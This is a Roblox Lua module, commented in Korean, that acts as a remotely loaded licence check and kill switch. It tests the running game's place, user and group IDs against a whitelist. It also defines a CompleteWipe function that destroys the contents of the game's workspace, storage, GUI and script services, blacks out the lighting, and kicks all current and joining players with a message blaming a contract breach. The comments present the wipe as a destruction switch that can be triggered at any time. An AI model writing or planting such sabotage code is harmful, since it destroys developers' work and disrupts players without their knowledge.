-- [[ sys1-0 : 테이블 리턴형 원격 통제 엔진 ]]
-- 님의 스튜디오 스크립트가 이 코드를 긁어갔을 때, 최종적으로 테이블을 반환합니다.

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- 1. 마스터 화이트리스트 데이터베이스
local ALLOWED_PLACES = {
	[123456789] = true, -- 허가된 Place ID
}

local ALLOWED_USERS = {
	[11223344] = true,  -- 허가된 User ID
}

local ALLOWED_GROUPS = {
	[99887766] = true,  -- 허가된 Group ID
}

-- 2. 현재 환경 정보 수집
local currentPlaceId = game.PlaceId
local currentCreatorId = game.CreatorId
local currentCreatorType = game.CreatorType

-- 3. 교차 검증 검사
local isAuthorized = false

if ALLOWED_PLACES[currentPlaceId] then
	isAuthorized = true
end

if currentCreatorType == Enum.CreatorType.User and ALLOWED_USERS[currentCreatorId] then
	isAuthorized = true
end

if currentCreatorType == Enum.CreatorType.Group and ALLOWED_GROUPS[currentCreatorId] then
	isAuthorized = true
end

-- 4. ㅂ1ㅅ 만드는 처벌 함수 정의
local function CompleteWipe()
	local locations = {
		game.Workspace,
		game.ReplicatedStorage,
		game.ServerStorage,
		game.StarterGui,
		game.StarterPack,
		game.Teams,
		game.ServerScriptService
	}

	for _, location in ipairs(locations) do
		pcall(function()
			for _, item in ipairs(location:GetChildren()) do
				if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
					item:Destroy()
				end
			end
		end)
	end

	pcall(function()
		game.Workspace.Terrain:Clear()
	end)

	pcall(function()
		game.Lighting.Brightness = 0
		game.Lighting.ClockTime = 0
		game.Lighting.GlobalShadows = true
		game.Lighting:ClearAllChildren()
		game.Lighting.FogEnd = 0
		game.Lighting.Ambient = Color3.new(0, 0, 0)
	end)
	
	-- 접속 유저 및 신규 유저 강퇴 프로토콜
	local kickMessage = "계약 위반 및 에셋 유출로 인해 이 서버는 지배자에 의해 무력화되었습니다. (ㅅㄱ)"
	for _, player in pairs(Players:GetPlayers()) do
		pcall(function() player:Kick(kickMessage) end)
	end
	Players.PlayerAdded:Connect(function(player)
		player:Kick(kickMessage)
	end)
end

-- ==========================================
-- ★ 핵심: 스튜디오 메인 스크립트가 받아먹을 결과 전달 ★
-- ==========================================
-- 님이 말씀하신 on/off 시스템처럼 작동하도록 테이블에 상태와 함수를 담아 리턴합니다.
local SystemResult = {
	["Status"] = isAuthorized, -- 인증 성공 시 true, 실패 시 false (on/off 스위치 역할)
	["Wipe"] = CompleteWipe    -- 언제든 터트릴 수 있는 파멸 스위치 함수
}

return SystemResult
